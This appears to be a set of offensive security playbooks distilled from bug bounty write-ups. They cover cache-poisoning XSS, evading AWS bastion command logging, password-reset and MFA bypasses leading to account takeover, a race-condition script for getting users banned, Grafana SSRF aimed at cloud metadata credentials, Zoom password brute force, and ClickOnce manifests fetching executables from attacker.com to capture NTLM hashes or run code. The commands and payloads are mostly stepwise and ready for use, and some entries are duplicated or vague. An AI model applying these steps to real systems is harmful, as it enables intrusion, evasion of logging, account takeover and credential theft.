tools_recommended: Burp Suite: Repeater to craft and send requests, Intruder for fuzzing parameters.
curl: For scripting and automated testing.
success_indicators: The response to the subsequent GET request contains the injected XSS payload (e.g., `alert(document.domain)` executes in the browser).
The `Vary` header might indicate which request attributes were used for caching, potentially showing differences if the cache key was not properly configured.
failure_indicators: The GET request returns a normal response, not reflecting the POST payload. This indicates the POST request body was not used in the cache key or the endpoint does not reflect body content.

A 403 Forbidden or other error response to the GET request might indicate a WAF is blocking the cached payload, or the server is correctly differentiating requests. Pivot to other cache poisoning vectors or different parameters.

playbooks.impact: Stored XSS, which can lead to session hijacking, credential theft, defacement, or further exploitation of the user's session. In the context of newsletter exploitation mentioned, it could lead to manipulation of user subscriptions or content.
playbooks.key_lesson: When NGINX is configured to cache POST requests, ensure the `proxy_cache_key` directive includes `$request_body` or an equivalent to prevent cache poisoning by distinguishing requests based on their body content.

meta.title: Amazon AWS Bastion - Logger Bypass

trigger_conditions.when_to_apply: When the AWS bastion host's command logging relies on the /etc/bashrc file and the PROMPT_COMMAND environment variable to log user commands.
prerequisites: Attacker has SSH access to the AWS bastion host as an authenticated user.
applicability_signals: Existence of /etc/bashrc with PROMPT_COMMAND set to 'history -a >(logger ...)'
User can SSH into the bastion host.
skip_if: PROMPT_COMMAND is not present or not set to the vulnerable logging mechanism.
WAF or other security controls prevent execution of shell commands or modification of environment variables.

recon_steps: Step 1: SSH into the AWS bastion host as an authenticated user.
Step 2: Inspect the contents of /etc/bashrc to confirm the presence of the vulnerable PROMPT_COMMAND definition.
Step 3: Execute 'env' to check if PROMPT_COMMAND is set.
attack_steps: Step 1: Attempt to bypass logging using the '--posix' flag with bash. SSH into the bastion using: ssh -t 'bash --posix'

Step 2: If the above fails or is insufficient, attempt to unset PROMPT_COMMAND by creating a new 'logger' command in the current directory, making it executable, and prepending the current directory to the PATH. Execute: echo '' > logger; chmod +x logger; export PATH=$PWD:$PATH
Step 3: Alternatively, spawn a new bash shell that ignores RC files and attempt to unset PROMPT_COMMAND. Execute: bash --norc --noprofile
Step 4: After successfully bypassing the logging mechanism (e.g., by unsetting PROMPT_COMMAND or causing it to fail), execute arbitrary commands.
Step 5: Verify that the executed commands do not appear in /var/log/bastion/bastion.log or Cloudwatch logs.
tools_recommended: ssh client
grep (for log inspection)
success_indicators: Commands executed after the bypass are not found in /var/log/bastion/bastion.log.
PROMPT_COMMAND is successfully unset or no longer active.
Error messages related to PROMPT_COMMAND syntax failure or being readonly are no longer displayed for subsequent commands.
failure_indicators: bash --posix results in 'syntax error near unexpected token' but 'unset PROMPT_COMMAND' still fails with 'cannot unset: readonly variable' indicating PROMPT_COMMAND is still active and enforced.
Commands executed after the bypass attempts still appear in the bastion logs.
WAF blocks attempts to create/execute new commands or modify PATH/environment variables.

playbooks.impact: Attacker can execute arbitrary commands on the bastion host without them being logged by the AWS bastion's logging mechanisms, potentially leading to further system compromise or data exfiltration without detection.
playbooks.key_lesson: Command logging mechanisms that rely solely on modifying shell startup files or environment variables like PROMPT_COMMAND are susceptible to bypass techniques such as altering the PATH, using shell flags to disable parsing, or spawning new shell instances that ignore configuration files.

meta.title: Vulnerability in new TouchID feature put iCloud accounts at risk of being breached

trigger_conditions.when_to_apply: When the 'Sign in with Apple' feature is implemented and susceptible to authentication bypass.
prerequisites: The target application must use 'Sign in with Apple' for authentication.
applicability_signals: Presence of 'Sign in with Apple' authentication option on a login or sign-up page.
skip_if: The 'Sign in with Apple' implementation correctly validates authorization codes or tokens without any observable bypass vectors.

recon_steps: Step 1: Identify applications that offer 'Sign in with Apple' as an authentication method.
Step 2: Analyze the authentication flow for 'Sign in with Apple' by observing network requests during the sign-in process.
attack_steps: Step 1: Attempt to bypass the authentication by manipulating the authorization code or token exchange process.
Step 2: If the target relies on a client-side validation of the authorization code or token, attempt to tamper with these values.
Step 3: If server-side validation is present, investigate potential logic flaws or timing attacks that could lead to an authentication bypass.
payloads_or_patterns: Exploiting specific logic flaws in the authorization code/token validation flow. (Insufficient detail in writeup)
tools_recommended: Burp Suite: To intercept and modify authentication requests.
Custom scripts: To automate the testing of authorization code/token manipulation.
success_indicators: Successful login without providing valid credentials or session tokens through the 'Sign in with Apple' flow.
Account takeover or unauthorized access to user data.
failure_indicators: All attempts to bypass authentication are rejected with invalid token or authorization errors. → Consider other authentication vulnerabilities or attack vectors.

playbooks.impact: An attacker could gain unauthorized access to a user's iCloud account and any associated data or services.
playbooks.key_lesson: Thoroughly test the 'Sign in with Apple' authentication flow for logic flaws and improper validation of authorization codes or tokens to prevent authentication bypass.

meta.title: Account takeover in cups.mail.ru
meta.category: Logic flaw, Password reset, Account takeover

trigger_conditions.when_to_apply: When the password reset functionality does not properly validate the presence of the one-time password code in the final reset request.
prerequisites: Attacker knows or can obtain the target user's registered email address.
applicability_signals: Password reset flow involves multiple steps with distinct URLs.
The final password reset request (step 4) contains 'password', 'email', and 'code' parameters.
skip_if: The password reset functionality returns an error or invalidates the request if the 'code' parameter is missing in step 4, even if other parameters are manipulated.

recon_steps: Step 1: Navigate to the password reset page for a target user's email on cups.mail.ru, observing the redirection to step 1 URL.
Step 2: Observe the request and response for step 1, identifying the email parameter.
Step 3: Observe the request and response for step 3, noting the submission of the one-time password code.
Step 4: Observe the request and response for step 4, which contains the 'password', 'email', and 'code' parameters.
Step 5: Identify the 'click to come in link' functionality or related request that proceeds after a successful password reset code validation.
attack_steps: Step 1: Initiate the password reset process for a victim's email address.
Step 2: Intercept the request to cups.mail.ru/faq/restore-password/restore?step=4.
Step 3: Modify the intercepted request by removing the 'code' parameter, leaving 'password' and 'email' parameters.
Step 4: Forward the modified request.
Step 5: Observe the redirection to step 5. Crucially, do *not* click the 'click to come in link' initially, but rather observe the behavior.
Step 6: If the password reset is reported as successful (as per writeup), attempt to log in with the victim's email and the new password.

Step 7: If login fails, revisit step 5. The writeup implies that clicking the 'click to come in link' *after* the modified request is sent is the actual trigger for the account takeover. Therefore, after sending the modified request and observing the redirection to step 5, click the 'click to come in link'.
tools_recommended: Burp Suite Proxy: To intercept and modify HTTP requests during the password reset flow.
success_indicators: Successful login to the victim's account using the reset password.
The application reports password reset success even after removing the 'code' parameter, especially if confirmed by subsequent login.
failure_indicators: The application returns an error or invalidates the password reset if the 'code' parameter is missing in step 4.
Login with the reset password fails after the manipulated request.
The application requires a valid 'Referer' header or other checks that are not bypassed by simply removing the code.

playbooks.impact: Full account takeover of the victim's cups.mail.ru account, allowing the attacker to read emails, send emails, or perform other actions within the account.
playbooks.key_lesson: Always validate that critical parameters like one-time-passwords (OTPs) or session tokens are strictly enforced in all subsequent requests that perform sensitive actions, not just initial validation steps.

meta.title: Banning users Race condition

trigger_conditions.when_to_apply: When an application allows users to report other users to trigger a ban, and the reporting mechanism lacks proper rate limiting or de-duplication across different accounts, allowing a race condition to bypass the minimum report threshold.
prerequisites: Attacker must have an authenticated account.
Target user must be reportable.
Reporting mechanism must have a threshold (e.g., 100 reports) to ban a user.
applicability_signals: The existence of a 'report user' or similar functionality.
The reporting endpoint accepts JSON data.
The application has a feature that bans users after a certain number of reports.
The application attempts to implement rate limiting but it can be bypassed.
skip_if: Reporting endpoint consistently returns an error indicating the user has already been reported by the same account.
All reporting requests are blocked by a WAF.
The application correctly identifies and rejects duplicate reports from different accounts when attempting a race condition attack.

recon_steps: Step 1: Identify the API endpoint used for reporting a user. This can often be found by observing network traffic in browser developer tools when clicking a 'report' button.
Step 2: Inspect the request payload and headers for the reporting endpoint to understand the expected data format and any authentication tokens.
Step 3: Attempt to report a user once and observe the response to confirm success and identify any rate limiting indicators.
attack_steps: Step 1: Send a POST request to the reporting endpoint (`POST /user/victim HTTP/1.1`) for the target victim user.
Step 2: Configure a tool like Burp Suite's Turbo Intruder or a custom script to send a large number of concurrent requests to the reporting endpoint.

Step 3: The goal is to send more than the required number of reports (e.g., >100) within a short time frame before the server can properly process and de-duplicate each report from different attacker accounts.
Step 4: Monitor the victim user's account status after the attack to see if they have been banned.
payloads_or_patterns: Turbo Intruder script: `def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100, pipeline=True) for i in range(30): engine.queue(target.req, target.baseInput, gate='race1') engine.openGate('race1') engine.complete(timeout=60)` (adjust `concurrentConnections` and `requestsPerConnection` as needed)
tools_recommended: Burp Suite (Turbo Intruder plugin for concurrent requests)
Custom Python script with 'requests' library for high concurrency
success_indicators: The victim user's account is banned or flagged as inappropriate by the application.
Receiving a 200 OK response for a significant number of report requests, indicating they were accepted by the server.
failure_indicators: Consistent 429 Too Many Requests or similar rate limiting errors before reaching the report threshold.
Reports from different accounts are correctly de-duplicated and the victim is not banned.
Server returns specific error codes indicating the user has already been reported by the same account.

playbooks.impact: An attacker can cause an arbitrary user to be banned from the platform by exploiting a race condition in the reporting mechanism, potentially leading to denial of service or reputational damage for the victim.
playbooks.key_lesson: When implementing features that require a threshold of actions (like reports) to trigger an outcome (like a ban), ensure robust de-duplication and atomicity to prevent race conditions, especially when multiple authenticated users can perform the action.

meta.title: Multi-factor Auth Bypass with Password Reset Function

trigger_conditions.when_to_apply: This technique is applicable when a web application implements a password reset function that generates a Base64 encoded token containing a predictable SHA-256 hash of the user's password.
prerequisites: The target application must have a multi-factor authentication (MFA) mechanism enforced.
The password reset function must generate a token that is sent to the user.
The generated token must be Base64 encoded and contain a predictable component.
applicability_signals: Password reset links contain Base64 encoded tokens.
Decoding the Base64 token reveals a username followed by a seemingly random string.
Analysis of multiple tokens shows a consistent pattern, with only a prefix and suffix changing.
skip_if: The password reset token is not Base64 encoded.
The token does not contain any predictable components (e.g., it's entirely random and unguessable).
The password reset flow requires the old password to be entered.
After changing the password, the user is immediately logged out and required to re-authenticate with MFA.

recon_steps: Step 1: Initiate a password reset request for a known user account.
Step 2: Analyze the Base64 encoded token in the password reset URL. Decode the token and identify if it contains a username and a seemingly random string.

Step 3: Generate several password reset tokens for the same user and analyze the variations. Look for fixed patterns in the encoded token, specifically identifying if a portion of the token appears to be a hash (e.g., SHA-256).
attack_steps: Step 1: Obtain the user's password reset token (e.g., by initiating a reset for your own account or a compromised account).
Step 2: Decode the Base64 token to extract the username and the random string.
Step 3: Determine the hashing algorithm used for the random string (likely SHA-256 based on the writeup).
Step 4: Use a script to generate SHA-256 hashes of common or known passwords for the target user.
Step 5: If a matching hash is found, reconstruct the full token by combining the username, the hash, and the original prefix/suffix observed in the token.
Step 6: Construct the password reset URL with the crafted token.
Step 7: First, visit the password reset page to initiate the process.
Step 8: Then, immediately visit the constructed password reset URL with the crafted token.
payloads_or_patterns: The structure of the generated token after decoding Base64 is: <username> + <SHA-256_hash_of_password> + <random_suffix>
tools_recommended: Burp Suite: To intercept and modify HTTP requests and analyze responses.
Online Base64 decoder/encoder.

Python script: For hashing passwords and comparing them with the token's hash component. Example script logic: Iterate through a wordlist, hash each password with SHA-256, and compare with the observed hash in the token.
success_indicators: Successful password change without requiring the old password.
Direct login to the account after changing the password, bypassing MFA.
The application allowing the password to be reset to the attacker's desired password.
failure_indicators: "No such token exists" error message implies the crafted token is incorrect or the attack timing is off.
404 or other error responses indicate an invalid URL or token.
If the token does not contain a predictable hash or the hash algorithm cannot be identified, this technique will fail.

playbooks.impact: Full account takeover by bypassing multi-factor authentication and changing the user's password, allowing the attacker to access sensitive financial and banking information, perform unauthorized transactions, and control the user's account.
playbooks.key_lesson: When encountering Base64 encoded tokens in password reset flows, always investigate for predictable components like password hashes. Ensure the correct sequence of actions (e.g., visiting the reset page first, then the token link) is followed for time-sensitive exploits.

meta.title: CVE-2020–9854: "Unauthd" (three) logic bugs ftw!

trigger_conditions.when_to_apply: This technique applies when a local user can influence the code signing information of a process that interacts with authd, particularly if authd does not validate the integrity of the code signing information before processing entitlements.
prerequisites: The target system is running a vulnerable version of macOS (< 10.15.5).
The attacker has local user access to the target machine.
applicability_signals: Analysis of authd's internal functions reveals a lack of `SecCodeCheckValidity` or `SecCodeCheckValidityWithErrors` calls before `SecCodeCopySigningInformation`.
The ability to codesign arbitrary binaries with custom entitlements on macOS.
skip_if: macOS version is 10.15.5 or later.
Security framework validation mechanisms have been patched.

recon_steps: Step 1: Identify the macOS version. If it is < 10.15.5, proceed.
Step 2: Analyze the source code or behavior of `authd` and `Security.framework` to confirm the lack of strict code signing validation before processing entitlements.
attack_steps: Step 1: Create a malicious binary that can be signed with custom entitlements. This binary doesn't need to perform any specific action other than being signed.

Step 2: Sign the malicious binary with specific, elevated entitlements that `authd` might check for. The writeup implies that the vulnerability is in how `authd` handles entitlements when `SecCodeCopySigningInformation` is called without prior validation.

Step 3: Find a way to have `authd` process the code signing information of this malicious binary. The writeup suggests that third-party applications and Apple's own frameworks interact with `authd` through Security.framework APIs.

Step 4: Exploit the logic bug within `authd` to gain elevated privileges. The details of the specific right or entitlement manipulation that leads to LPE are not fully elaborated in the provided text, but the core is bypassing validation.
tools_recommended: codesign (macOS command-line tool for code signing)
Disassembler (e.g., Hopper, Ghidra) to analyze `authd` and `Security.framework` binaries.
success_indicators: Gaining root privileges on the macOS system.
Successfully bypassing System Integrity Protection (SIP).
failure_indicators: `authd` rejects the signed binary due to invalid code signing information (indicates validation is present).
No privilege escalation achieved after attempting to exploit the entitlement handling (indicates the specific entitlement or exploitation path is incorrect or patched).

playbooks.impact: Local privilege escalation from a standard user to root, potentially allowing for full control of the system and bypass of security mechanisms like System Integrity Protection (SIP).
playbooks.key_lesson: When interacting with security-sensitive daemons that process signed code, always validate the integrity of the code signature (e.g., using SecCodeCheckValidity) before trusting or acting upon any associated entitlements.

meta.title: An interestingly simple to test CSRF bypass

trigger_conditions.when_to_apply: When typical XSS payloads fail and the application performs state-changing actions via POST/GET requests that lack CSRF protection, especially if JavaScript is used to make these requests.
prerequisites: Attacker must have an authenticated session in the target application.
applicability_signals: Application has features like adding to cart, wishlist, or placing orders.
JavaScript code within the HTML source that makes POST or GET requests to specific endpoints.
No obvious XSS vulnerabilities found after initial testing.
skip_if: Application correctly implements CSRF tokens for all state-changing requests.
All input parameters are strictly validated and sanitized, preventing any form of injection.
WAF blocks all suspicious requests.

recon_steps: Step 1: Navigate to the target website and observe its functionality (e.g., adding items to cart, wishlist, placing orders).
Step 2: View the HTML source code of the main page, paying close attention to embedded JavaScript code.
Step 3: Analyze the JavaScript code to identify POST and GET requests, noting the endpoints and parameters used for state-changing actions.
attack_steps: Step 1: Identify a state-changing action triggered by JavaScript (e.g., adding an item to a wishlist).
Step 2: Construct a malicious HTML page that includes an invisible form or JavaScript that mimics the original request, but targets the victim's browser.
Step 3: Craft a CSRF payload that, when submitted by the victim, performs the unintended action.

Step 4: If the target application uses JavaScript for requests, exploit the same logic in a crafted request (e.g., using `fetch` or `XMLHttpRequest` in a malicious HTML page) to bypass CSRF protection.
payloads_or_patterns:
Example of a crafted POST request (manual or via JS): `POST /add-to-wishlist HTTP/1.1
Host: <TARGET_URL>
Cookie: <SESSION_TOKEN>
Content-Type: application/x-www-form-urlencoded

product_id=<product_id>`

Example of a crafted GET request (manual or via JS): `GET /remove-item?id=<item_id> HTTP/1.1
Host: <TARGET_URL>
Cookie: <SESSION_TOKEN>`
tools_recommended: Burp Suite: To intercept and analyze HTTP requests, identify state-changing actions and their parameters.
Browser Developer Tools: To inspect HTML source, JavaScript code, and network requests.
success_indicators: The unintended action is performed on the victim's account (e.g., item added to wishlist, product removed from cart, password changed).
The target application logs the successful execution of the action associated with the victim's session.
failure_indicators: The request fails with a 403 Forbidden or similar error, indicating CSRF protection is likely in place and effective.
The action is not performed, and the application returns an error or no response.

playbooks.impact: Attacker can perform any state-changing action on behalf of an authenticated user without their explicit consent, potentially leading to data modification, unauthorized purchases, or account compromise.
playbooks.key_lesson: Always review the HTML source code for embedded JavaScript that makes HTTP requests, as these can reveal endpoints and parameters for state-changing actions that may be vulnerable to CSRF, especially if not protected by standard CSRF tokens.

meta.title: CVE-2020-13379 Unauthenticated Full-Read SSRF in Grafana

trigger_conditions.when_to_apply: When a Grafana instance is accessible and running a vulnerable version (3.0.1 - 7.0.1).
prerequisites: Target Grafana instance must be running a vulnerable version.
applicability_signals: Existence of the /avatar/:hash endpoint.
Observing Gravatar images being loaded via this endpoint.
skip_if: Grafana is not installed or accessible.
Grafana version is not within the vulnerable range.

recon_steps: Step 1: Identify Grafana instances on the target network or public internet.

Step 2: Check Grafana version if possible (e.g., by looking at footer or About page, though this can be hidden). If version is not easily discoverable, assume vulnerability and proceed with exploitation attempt.
attack_steps: Step 1: Craft a malicious URL by injecting parameters into the /avatar/:hash endpoint.
Step 2: The injected parameters should exploit the URL decoding and the redirect chain involving secure.gravatar.com and i0.wp.com.
Step 3: The goal is to redirect traffic to an attacker-controlled host or internal network resource (e.g., AWS Metadata API).
Step 4: Monitor attacker-controlled server for incoming requests or analyze responses for sensitive information.
tools_recommended: Burp Suite: To intercept and modify requests, and to host the attacker-controlled server.
success_indicators: Receiving an HTTP request at <YOURHOSTHERE> from the Grafana instance, potentially containing data from internal services (e.g., AWS metadata).
Response from the Grafana instance includes unexpected content or headers that indicate successful redirection.
Successful retrieval of AWS instance metadata like IAM credentials from http://169.254.169.254/
failure_indicators: 404 or other error responses on the /avatar/:hash endpoint suggest the endpoint may not exist or is configured differently.
No callback or unexpected response to <YOURHOSTHERE> indicates the SSRF chain did not function as expected. This could be due to WAF blocking or incorrect payload construction.

playbooks.impact: Unauthenticated attacker can perform Server-Side Request Forgery (SSRF) to read arbitrary files or access internal network resources, including highly sensitive cloud metadata APIs (like AWS IAM credentials), leading to potential compromise of the entire cloud infrastructure.
playbooks.key_lesson: Always investigate URL parameter injection vulnerabilities in endpoints that fetch external resources, especially those involving redirects and third-party services, as they can lead to powerful SSRF exploits.

meta.title: CVE-2020–9854: "Unauthd" - (three) logic bugs ftw!

trigger_conditions.when_to_apply: When a user process needs to interact with authd for privileged actions, and the validation of code signing information is not strictly enforced.
prerequisites: Target is running a vulnerable version of macOS (< 10.15.5).
applicability_signals: The `authd` process is running and handling requests.
The `SecCodeCopySigningInformation` function is called without a preceding `SecCodeCheckValidity` call.
skip_if: System Integrity Protection (SIP) is fully enabled and not bypassed.
macOS version is patched against this vulnerability.

recon_steps: Step 1: Identify processes interacting with `authd` on the target system.
Step 2: Analyze the source code or binary of `authd` to understand its interaction with `Security.framework` and `SecCodeCopySigningInformation`.
attack_steps: Step 1: Craft a malicious executable or binary that has a valid signature but includes arbitrary entitlements by exploiting the missing `SecCodeCheckValidity` call.
Step 2: Use the crafted binary to interact with `authd` to request a privileged operation.
Step 3: Leverage the granted (but improperly validated) entitlements to escalate privileges.
tools_recommended: macOS command-line tools (e.g., `codesign`, `lipo`)
Disassembler/Debugger (e.g., IDA Pro, Hopper, LLDB)
success_indicators: The crafted binary is able to perform privileged actions that it should not be allowed to.
Successful privilege escalation to root or kernel level.
failure_indicators: The `authd` process rejects the request due to invalid code signing information or missing entitlements (4xx or 5xx error codes).
The macOS system logs indicate a code signing validation failure.
Privilege escalation fails, and the process remains at the original user level.

playbooks.impact: Attacker can escalate privileges from a low-privileged user to root and potentially bypass System Integrity Protection (SIP) to achieve kernel-level code execution.
playbooks.key_lesson: Always validate code signing information using `SecCodeCheckValidity` before processing entitlements in privileged daemons like `authd` to prevent exploitation of logic flaws that allow arbitrary entitlement injection.

meta.title: One Click to Compromise -- Fun With ClickOnce Deployment Manifests
meta.vuln_type: NTLMv2 Hash Disclosure | Remote Code Execution

trigger_conditions.when_to_apply: When the target environment utilizes ClickOnce for application deployment and the user is susceptible to clicking malicious links or opening attachments. This is particularly effective if Internet Explorer is the default browser, as it automatically executes manifests.
prerequisites: The target must be a Windows machine with the ClickOnce runtime installed.
The target user must be tricked into clicking a malicious `.application` file link or opening an attached `.application` file.
applicability_signals: Observing `.application` file extensions being used for software distribution.
Discovering environments where users are encouraged to install applications via custom deployment mechanisms.
skip_if: The target environment has strict endpoint security preventing the execution of unsigned or untrusted applications.
The user's default browser is not Internet Explorer or is configured to prevent automatic manifest execution.

recon_steps: Step 1: Identify potential targets within an organization that might use ClickOnce for application deployment by searching for `.application` files or related deployment infrastructure.
Step 2: Investigate if Internet Explorer is a commonly used browser in the target environment.
attack_steps: Step 1: Craft a malicious ClickOnce deployment manifest (`.application` file) that points to a malicious application manifest (`.manifest` file) hosted on an attacker-controlled server.
Step 2: Host both the `.application` and `.manifest` files on a web server accessible by the target. Alternatively, send the `.application` file as an email attachment.
Step 3: Induce the target user to click the `.application` file link (e.g., via phishing email, embedded in an HTML page).
Step 4: If Internet Explorer is used, it will automatically attempt to download and execute the manifest, triggering the ClickOnce runtime (`dfsvc.exe`).
Step 5: The ClickOnce runtime will then request the application manifest from the attacker-controlled server.

Step 6: As part of the manifest parsing, `dfsvc.exe` will attempt to download the deployment manifest from the attacker-controlled server again to check for updates. This request will contain NTLMv2 credentials if the target is on a Windows domain.
Step 7: Capture the NTLMv2 hash from the HTTP request to the attacker-controlled server.
Step 8 (Optional): The `.manifest` file can be crafted to specify a C# or C++ executable to be downloaded and run on the target machine, achieving remote code execution.
payloads_or_patterns:
Example `.application` content (attacker server: http://attacker.com/app/):
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity name="MyClickOnceApp" version="1.0.0.0" />
  <dependency>
    <dependentAssembly dependencyType="install" codebase="http://<TARGET_URL>/app/MyApplication.manifest" size="0">
      <assemblyIdentity name="MyApplication" version="1.0.0.0" />
    </dependentAssembly>
  </dependency>
</assembly>

Example `.manifest` content (specifying an executable to run):
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <assemblyIdentity name="MyApplication" version="1.0.0.0" />
  <file name="MyApp.exe" src="http://<TARGET_URL>/app/MyApp.exe" />
</assembly>

Curl command for capturing NTLM hashes:
curl -v -o /dev/null http://<TARGET_URL>/app/MyApplication.manifest
tools_recommended: Burp Suite: To set up an HTTP server to capture NTLM hashes.
Custom script: To generate ClickOnce deployment and application manifests.
Phishing framework: To deliver the malicious `.application` file.
success_indicators: Receiving an HTTP request to the attacker-controlled server containing an `Authorization: NTLM ...` header with a valid NTLMv2 hash.
Successful execution of a payload (`.exe`) on the target machine, confirmed by a reverse shell or other indicators of compromise.
failure_indicators: No HTTP requests received on the attacker's server after the user clicks the `.application` file (e.g., due to network restrictions or browser configurations).
Error messages related to manifest parsing or application deployment on the target machine. -> Pivot to different RCE vectors or focus solely on hash capture if execution fails.

playbooks.impact: Remote code execution on target machines, allowing for full system compromise. Disclosure of NTLMv2 hashes which can be cracked offline to obtain user credentials, enabling lateral movement and privilege escalation.
playbooks.key_lesson: Always analyze custom application deployment mechanisms like ClickOnce, as they can serve as effective vectors for initial access, RCE, and credential harvesting.

meta.title: Zoom Security Exploit – Cracking private meeting passwords

trigger_conditions.when_to_apply: When Zoom meetings are joined via the web client and protected by a 6-digit numeric password.
prerequisites: Attacker knows or can discover the Meeting ID.
applicability_signals: The meeting join URL contains a meeting ID.
The web client `/wc/join/<meeting_id>` endpoint exists and presents a password entry form.
Default passwords are 6 digits and numeric.
skip_if: Rate limiting is in place for password attempts.
Meeting passwords are not numeric or are longer than 6 digits.
User login is required to join meetings via the web client.

recon_steps: Step 1: Identify a Zoom meeting with a visible Meeting ID.
Step 2: Navigate to the Zoom web client join page for that meeting ID: `https://zoom.us/wc/join/<meeting_id>`.
Step 3: Observe if a password entry screen appears, indicating the meeting is password protected and potentially using a 6-digit numeric password.
attack_steps: Step 1: Iterate through all possible 6-digit numeric passwords (000000 to 999999).
Step 2: For each password attempt, submit a POST request to the Zoom web client endpoint responsible for password validation.
Step 3: The writeup implies an XHR GET request is fired upon successful password entry, leading to a privacy policy page. This indicates a successful password discovery.
payloads_or_patterns: POST Request to `https://zoom.us/wc/join/<meeting_id>` with parameters like `password: <6_digit_password>` and potentially CSRF tokens if applicable (though the writeup suggests broken CSRF).
tools_recommended: Burp Suite Repeater or Intruder for brute-forcing password attempts.
Custom script to automate the iteration and submission of password guesses.
success_indicators: Redirection to a page other than the password entry screen upon submitting a guessed password.
The writeup mentions reaching a privacy policy page after successful password entry.
failure_indicators: Staying on the password entry screen or receiving an error message for all password attempts.
429 Too Many Requests response if rate limiting is implemented.

playbooks.impact: An attacker can gain unauthorized access to private Zoom meetings, potentially eavesdropping on conversations and accessing shared content.
playbooks.key_lesson: Always implement robust rate limiting on authentication and password brute-force attempts. Ensure default password policies are secure (e.g., not short and numeric).

meta.title: The Noob Way Of Taking Over Accounts

trigger_conditions.when_to_apply: When a web application allows users to register companies with unique names and performs client-side validation for company name uniqueness.
prerequisites: The target application has a company registration feature.
The application performs client-side validation for company name uniqueness.
applicability_signals: Registration page allows company name input.
Attempting to register a duplicate company name results in a client-side error or message.
The validation appears to be client-side only.
skip_if: Company name uniqueness is enforced server-side.
No company registration feature is available.

recon_steps: Step 1: Navigate to the company registration page and observe the input fields and any client-side validation messages.
Step 2: Attempt to register a company with a common name (e.g., 'TestCompany').
Step 3: Observe if a client-side error message appears indicating the name is already taken.
attack_steps: Step 1: Register a company with a chosen name (e.g., 'Tommy') using an attacker-controlled email address.
Step 2: Visit the registration page again with a different attacker-controlled email address.
Step 3: Attempt to register the *exact same company name* ('Tommy'). Observe that a client-side validation message appears.

Step 4: Re-register the company using a homograph (visually similar character) in the company name (e.g., 'Tömmy' using the unicode character 'ö' U+00F6 Latin Small Letter O with diaeresis instead of 'o' U+006F Latin Small Letter O).
